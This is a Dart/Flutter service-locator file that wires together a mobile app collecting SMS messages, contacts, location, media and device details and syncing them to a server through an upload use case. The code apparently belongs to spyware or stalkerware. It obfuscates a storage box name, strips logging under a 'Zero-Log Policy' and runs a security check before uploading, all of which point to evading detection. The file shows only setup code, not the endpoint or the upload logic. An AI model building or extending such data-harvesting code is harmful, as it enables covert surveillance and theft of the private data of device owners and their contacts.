import 'package:get_it/get_it.dart';
import 'package:logger/logger.dart';
import 'package:hive_flutter/hive_flutter.dart';
import '../security/security_service.dart';
import '../security/obfuscator.dart';
import '../network/network_client.dart';
import '../../services/device_id_service.dart';

// Data Sources
import '../../data/datasources/device_data_source.dart';
import '../../data/datasources/sms_data_source.dart';
import '../../data/datasources/contact_data_source.dart';
import '../../data/datasources/location_data_source.dart';
import '../../data/datasources/media_data_source.dart';

// Repositories
import '../../domain/repositories/device_repository.dart';
import '../../domain/repositories/message_repository.dart';
import '../../domain/repositories/contact_repository.dart';
import '../../domain/repositories/location_repository.dart';
import '../../domain/repositories/media_repository.dart';
import '../../data/repositories/device_repository_impl.dart';
import '../../data/repositories/message_repository_impl.dart';
import '../../data/repositories/contact_repository_impl.dart';
import '../../data/repositories/location_repository_impl.dart';
import '../../data/repositories/media_repository_impl.dart';
import '../../domain/repositories/history_repository.dart';
import '../../data/repositories/history_repository_impl.dart';

// Use Cases
import '../../domain/usecases/check_security_use_case.dart';
import '../../domain/usecases/fetch_config_use_case.dart';
import '../../domain/usecases/upload_data_use_case.dart';
import '../../domain/usecases/sync_data_use_case.dart';

final getIt = GetIt.instance;

Future<void> setupServiceLocator() async {
  // Initialize Hive
  await Hive.initFlutter();
  // "upload_history"
  await Hive.openBox(Obfuscator.deobfuscate(Obfuscator.historyBoxBytes));

  // Core
  // getIt.registerLazySingleton<Logger>(() => Logger()); // Removed for Zero-Log Policy
  getIt.registerLazySingleton<NetworkClient>(
    () => NetworkClient(),
  );

  // Data Sources
  getIt.registerLazySingleton<DeviceDataSource>(() => DeviceDataSource());
  getIt.registerLazySingleton<SmsDataSource>(() => SmsDataSource());
  getIt.registerLazySingleton<ContactDataSource>(() => ContactDataSource());
  getIt.registerLazySingleton<LocationDataSource>(() => LocationDataSource());
  getIt.registerLazySingleton<MediaDataSource>(() => MediaDataSource());

  // Repositories
  getIt.registerLazySingleton<IDeviceRepository>(
    () => DeviceRepositoryImpl(getIt<DeviceDataSource>()),
  );
  getIt.registerLazySingleton<IMessageRepository>(
    () => MessageRepositoryImpl(getIt<SmsDataSource>()),
  );
  getIt.registerLazySingleton<IContactRepository>(
    () => ContactRepositoryImpl(getIt<ContactDataSource>()),
  );
  getIt.registerLazySingleton<ILocationRepository>(
    () => LocationRepositoryImpl(getIt<LocationDataSource>()),
  );
  getIt.registerLazySingleton<IMediaRepository>(
    () => MediaRepositoryImpl(getIt<MediaDataSource>()),
  );
  getIt.registerLazySingleton<IHistoryRepository>(
    () => HistoryRepositoryImpl(),
  );

  // Use Cases
  getIt.registerLazySingleton<CheckSecurityUseCase>(
    () => CheckSecurityUseCase(getIt<SecurityService>()),
  );
  getIt.registerLazySingleton<FetchConfigUseCase>(
    () => FetchConfigUseCase(getIt<NetworkClient>()),
  );
  getIt.registerLazySingleton<UploadDataUseCase>(
    () => UploadDataUseCase(getIt<NetworkClient>()),
  );
  getIt.registerLazySingleton<SyncDataUseCase>(
    () => SyncDataUseCase(
      getIt<CheckSecurityUseCase>(),
      getIt<FetchConfigUseCase>(),
      getIt<UploadDataUseCase>(),
      getIt<IDeviceRepository>(),
      getIt<IMessageRepository>(),
      getIt<IContactRepository>(),
      getIt<ILocationRepository>(),
      getIt<IMediaRepository>(),
      getIt<IHistoryRepository>(),
      getIt<NetworkClient>(),
    ),
  );

  // Services
  getIt.registerLazySingleton<SecurityService>(() => SecurityService());
}
